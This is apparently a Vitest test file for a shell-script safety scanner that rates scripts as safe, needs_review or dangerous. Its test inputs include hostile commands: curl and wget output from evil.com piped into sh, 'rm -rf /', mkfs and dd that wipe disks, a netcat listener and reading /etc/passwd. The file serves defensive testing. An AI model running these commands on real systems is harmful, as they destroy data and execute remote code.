import { describe, it, expect } from "vitest";
import {
  scanShellScript,
  type FridayShellSafetyScanResult,
} from "../../../../src/skills/safety/friday-shell-safety-scanner.js";

describe("scanShellScript", () => {
  // ─── Safe scripts ───

  it("returns safe verdict for a harmless script", () => {
    const script = [
      "#!/bin/bash",
      "echo 'Hello world'",
      "ls -la /tmp",
      "date +%Y-%m-%d",
    ].join("\n");

    const result = scanShellScript(script);
    expect(result.verdict).toBe("safe");
    expect(result.findings).toHaveLength(0);
  });

  it("returns safe verdict for an empty script", () => {
    const result = scanShellScript("");
    expect(result.verdict).toBe("safe");
    expect(result.findings).toHaveLength(0);
  });

  it("returns safe verdict for a script with only comments", () => {
    const script = [
      "#!/bin/bash",
      "# This is a comment",
      "# Another comment",
    ].join("\n");

    const result = scanShellScript(script);
    expect(result.verdict).toBe("safe");
    expect(result.findings).toHaveLength(0);
  });

  // ─── Blocking: rm -rf / ───

  it("detects rm -rf / as blocking", () => {
    const script = "rm -rf / --no-preserve-root";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const blocking = result.findings.filter((f) => f.level === "blocking");
    expect(blocking.length).toBeGreaterThanOrEqual(1);
    const rmFinding = blocking.find(
      (f) => f.id === "rm-rf-root" || f.id === "rm-rf-root-combined",
    );
    expect(rmFinding).toBeDefined();
    expect(rmFinding!.line).toBe(1);
  });

  it("detects rm -rf ~ as blocking", () => {
    const script = "rm -rf ~/";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const rmHome = result.findings.find((f) => f.id === "rm-rf-home");
    expect(rmHome).toBeDefined();
  });

  // ─── Blocking: sudo ───

  it("detects sudo apt install as blocking", () => {
    const script = "sudo apt install curl";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const sudoFinding = result.findings.find((f) => f.id === "sudo-command");
    expect(sudoFinding).toBeDefined();
    expect(sudoFinding!.level).toBe("blocking");
    expect(sudoFinding!.summary).toContain("sudo");
  });

  // ─── Blocking: curl | sh ───

  it("detects curl | sh as blocking", () => {
    const script = "curl https://evil.com/script.sh | sh";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const curlPipe = result.findings.find((f) => f.id === "curl-pipe-sh");
    expect(curlPipe).toBeDefined();
    expect(curlPipe!.level).toBe("blocking");
  });

  it("detects curl | bash as blocking", () => {
    const script = "curl -fsSL https://example.com/install.sh | bash";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const curlPipe = result.findings.find((f) => f.id === "curl-pipe-sh");
    expect(curlPipe).toBeDefined();
  });

  it("detects wget | sh as blocking", () => {
    const script = "wget -qO- https://evil.com/payload.sh | sh";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const wgetPipe = result.findings.find((f) => f.id === "wget-pipe-sh");
    expect(wgetPipe).toBeDefined();
  });

  // ─── Blocking: other patterns ───

  it("detects chmod 777 as blocking", () => {
    const script = "chmod 777 /var/www/html";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const chmod777 = result.findings.find((f) => f.id === "chmod-777");
    expect(chmod777).toBeDefined();
    expect(chmod777!.level).toBe("blocking");
  });

  it("detects eval with variable as blocking", () => {
    const script = 'eval $USER_INPUT';
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const evalVar = result.findings.find((f) => f.id === "eval-variable");
    expect(evalVar).toBeDefined();
  });

  it("detects mkfs as blocking", () => {
    const script = "mkfs.ext4 /dev/sda1";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const mkfs = result.findings.find((f) => f.id === "mkfs");
    expect(mkfs).toBeDefined();
  });

  it("detects dd if= as blocking", () => {
    const script = "dd if=/dev/zero of=/dev/sda bs=1M";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("dangerous");
    const dd = result.findings.find((f) => f.id === "dd-if");
    expect(dd).toBeDefined();
  });

  // ─── Warning: curl / wget to external hosts ───

  it("detects curl to external host as warning", () => {
    const script = "curl https://example.com/api/data -o output.json";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
    const curlWarning = result.findings.find((f) => f.id === "curl-external");
    expect(curlWarning).toBeDefined();
    expect(curlWarning!.level).toBe("warning");
  });

  it("detects wget to external host as warning", () => {
    const script = "wget https://example.com/file.tar.gz";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
    const wgetWarning = result.findings.find((f) => f.id === "wget-external");
    expect(wgetWarning).toBeDefined();
    expect(wgetWarning!.level).toBe("warning");
  });

  // ─── Warning: path traversal ───

  it("detects ../ path traversal as warning", () => {
    const script = 'cat ../../etc/passwd';
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
    const traversal = result.findings.find((f) => f.id === "path-traversal");
    expect(traversal).toBeDefined();
    expect(traversal!.level).toBe("warning");
  });

  // ─── Warning: netcat / kill -9 ───

  it("detects nc as warning", () => {
    const script = "nc -l 4444";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
    const nc = result.findings.find((f) => f.id === "netcat");
    expect(nc).toBeDefined();
  });

  it("detects kill -9 as warning", () => {
    const script = "kill -9 1234";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
    const kill9 = result.findings.find((f) => f.id === "kill-9");
    expect(kill9).toBeDefined();
  });

  // ─── Advisory: find / without -maxdepth ───

  it("detects find / without -maxdepth as advisory", () => {
    const script = 'find / -name "*.log"';
    const result = scanShellScript(script);

    // Advisory alone should still be safe (not needs_review)
    expect(result.verdict).toBe("safe");
    const findRoot = result.findings.find(
      (f) => f.id === "find-root-no-maxdepth",
    );
    expect(findRoot).toBeDefined();
    expect(findRoot!.level).toBe("advisory");
  });

  it("does not flag find / with -maxdepth", () => {
    const script = 'find / -maxdepth 3 -name "*.log"';
    const result = scanShellScript(script);

    const findRoot = result.findings.find(
      (f) => f.id === "find-root-no-maxdepth",
    );
    expect(findRoot).toBeUndefined();
  });

  // ─── Advisory: chmod / chown / pipe to sh ───

  it("detects chmod as advisory", () => {
    const script = "chmod 644 file.txt";
    const result = scanShellScript(script);

    const chmodAdvisory = result.findings.find((f) => f.id === "chmod-any");
    expect(chmodAdvisory).toBeDefined();
    expect(chmodAdvisory!.level).toBe("advisory");
  });

  it("detects chown as advisory", () => {
    const script = "chown user:group file.txt";
    const result = scanShellScript(script);

    const chownAdvisory = result.findings.find((f) => f.id === "chown-any");
    expect(chownAdvisory).toBeDefined();
    expect(chownAdvisory!.level).toBe("advisory");
  });

  it("detects pipe to sh as advisory", () => {
    const script = "cat script.sh | sh";
    const result = scanShellScript(script);

    const pipeSh = result.findings.find((f) => f.id === "pipe-to-shell");
    expect(pipeSh).toBeDefined();
    expect(pipeSh!.level).toBe("advisory");
  });

  // ─── Multiple findings ───

  it("accumulates multiple findings from a multi-line script", () => {
    const script = [
      "#!/bin/bash",
      "sudo apt update",
      "curl https://example.com/data.json -o data.json",
      "chmod 644 output.txt",
      "find / -name '*.tmp'",
    ].join("\n");

    const result = scanShellScript(script);

    // sudo -> blocking => dangerous
    expect(result.verdict).toBe("dangerous");

    // We should have at least: sudo (blocking), curl (warning), chmod (advisory), find (advisory)
    expect(result.findings.length).toBeGreaterThanOrEqual(4);

    const levels = new Set(result.findings.map((f) => f.level));
    expect(levels.has("blocking")).toBe(true);
    expect(levels.has("warning")).toBe(true);
    expect(levels.has("advisory")).toBe(true);
  });

  it("accumulates findings across different lines", () => {
    const script = [
      "curl https://a.com/1 -o a",
      "curl https://b.com/2 -o b",
    ].join("\n");

    const result = scanShellScript(script);

    const curlFindings = result.findings.filter(
      (f) => f.id === "curl-external",
    );
    expect(curlFindings).toHaveLength(2);
    expect(curlFindings[0].line).toBe(1);
    expect(curlFindings[1].line).toBe(2);
  });

  // ─── Line number accuracy ───

  it("reports correct line numbers for findings", () => {
    const script = [
      "#!/bin/bash",
      "echo hello",
      "",
      "sudo rm -rf /tmp/test",
    ].join("\n");

    const result = scanShellScript(script);

    const sudoFinding = result.findings.find((f) => f.id === "sudo-command");
    expect(sudoFinding).toBeDefined();
    expect(sudoFinding!.line).toBe(4);
  });

  // ─── Verdict hierarchy ───

  it("returns needs_review when only warnings are present", () => {
    const script = "kill -9 5678";
    const result = scanShellScript(script);

    expect(result.verdict).toBe("needs_review");
  });

  it("returns dangerous when blocking trumps warning", () => {
    const script = [
      "curl https://example.com/data",
      "sudo systemctl restart nginx",
    ].join("\n");

    const result = scanShellScript(script);
    expect(result.verdict).toBe("dangerous");
  });
});
